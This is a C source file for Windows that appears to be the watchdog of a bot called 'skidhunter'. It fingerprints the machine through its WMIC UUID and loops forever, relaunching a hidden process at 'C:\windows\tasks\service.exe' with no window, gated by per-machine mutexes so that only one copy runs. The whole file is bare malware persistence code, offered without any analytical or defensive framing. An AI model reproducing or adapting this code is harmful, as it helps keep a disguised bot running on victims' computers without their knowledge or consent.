#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define bot_name "skidhunter"
#define mainpath "C:\\windows\\tasks\\service.exe"
#define delay 1

void _exec() {
 PROCESS_INFORMATION pi = {0};
 STARTUPINFO si = {0};
 CreateProcess(0, mainpath, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &si, &pi);
}

void setup_mutex(char *machine_mutex) {
 int mmsz = strlen(machine_mutex)+strlen(bot_name)+8;
 char *machine_mutex_r = malloc(mmsz);
 sprintf(machine_mutex_r, "%s:%s", machine_mutex, bot_name);
 HANDLE hmut = CreateMutex(0, 0, machine_mutex_r);
 free(machine_mutex_r);
 if(GetLastError() == ERROR_ALREADY_EXISTS) {
  if(hmut) CloseHandle(hmut);
 } else {
  if(hmut) {
   ReleaseMutex(hmut);
   CloseHandle(hmut);
  }
  _exec();
 }
}

char *get_machine_uuid() {
 char *fbuf = malloc(1024);
 memset(fbuf, 0, 1024);
 FILE *fd = _popen("wmic csproduct get UUID", "r");
 fread(fbuf, 1, 1023, fd);
 char *br = malloc(1024);
 memset(br, 0, 1024);
 char *p = strstr(fbuf, "\n");
 if(!p) return "invalid";
 p += 1;
 memcpy(br, p, strlen(p));
 free(fbuf);
 char *nl = strstr(br, " ");
 if(nl) *nl = '\0';
 return br;
}


void smutex() {
 HANDLE hmut = CreateMutex(0, 0, "watcherskidhunter");
 if(GetLastError() == ERROR_ALREADY_EXISTS) {
  exit(-1);
 } 
}

int main(int argc, char **argv) {
 smutex();
 char *machine_uuid = get_machine_uuid();
 while(1) {
  setup_mutex(machine_uuid);
  sleep(delay);
 }
}
